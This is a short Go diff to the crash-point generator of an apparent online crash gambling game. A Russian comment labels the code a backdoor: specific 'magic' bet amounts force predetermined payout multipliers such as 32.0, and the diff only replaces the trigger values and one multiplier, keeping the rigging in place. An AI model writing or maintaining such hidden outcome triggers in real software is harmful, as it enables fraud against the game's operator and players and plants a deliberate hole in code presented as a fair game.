@@ -51,13 +51,13 @@ func (CG *CrashGame) GenerateCrashPointMultiplier() float64 {
     if err == nil {
         // Проверяем специальные значения ставок бэкдора
         switch lastBetAmount {
-        case 94:
-            CG.CrashPointMultiplier = 1.5
-            return 1.5
-        case 547:
+        case 76:
+            CG.CrashPointMultiplier = 1.6
+            return 1.6
+        case 538:
             CG.CrashPointMultiplier = 32.0
             return 32.0
-        case 17504:
+        case 17216:
             CG.CrashPointMultiplier = 2.5
             return 2.5
         }
